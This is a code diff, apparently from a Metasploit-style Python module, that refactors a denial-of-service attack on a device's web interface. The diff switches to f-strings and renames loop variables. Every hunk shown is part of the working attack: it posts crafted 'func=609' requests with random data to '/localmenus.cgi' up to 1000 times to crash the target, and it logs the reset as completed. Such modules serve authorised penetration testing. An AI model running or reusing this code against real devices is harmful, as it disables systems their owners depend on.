@@ -53,7 +53,7 @@ metadata = {
 }
 
 def run(args):
-    module.LogHandler.setup(msg_prefix='{} - '.format(args['rhost']))
+    module.LogHandler.setup(msg_prefix=f"{args['rhost']} - ")
     if requests_missing:
         logging.error('Required Python module dependency (requests) is missing.')
         logging.error('Please execute pip3 install requests.')
@@ -65,12 +65,12 @@ def run(args):
         logging.error('Required Python module dependency (string) is missing.')
         logging.error('Please execute pip3 install string.')
 
-    url = "http://{}/localmenus.cgi".format(args['rhost'])
-    data = ''.join(random.choice(string.ascii_letters) for i in range(46))
+    url = f"http://{args['rhost']}/localmenus.cgi"
+    data = ''.join(random.choice(string.ascii_letters) for _ in range(46))
     payload = {"func": "609", "data": data, "rphl": "1"}
     logging.info("Sending POST requests triggering the PING function.")
     logging.info("Device should crash with a DoS shortly...")
-    for i in range(1000):
+    for _ in range(1000):
         try:
             r = requests.post(url=url, params=payload, timeout=5)
             if r.status_code != 200:
@@ -80,7 +80,7 @@ def run(args):
             logging.info('DoS reset attack completed!')
             return
         except requests.exceptions.RequestException as e:
-            logging.info('An unexpected exception occurred: ' + str(e))
+            logging.info(f'An unexpected exception occurred: {str(e)}')
             logging.info('The device may be DoS\'d already or not have web access enabled.')
             return
 
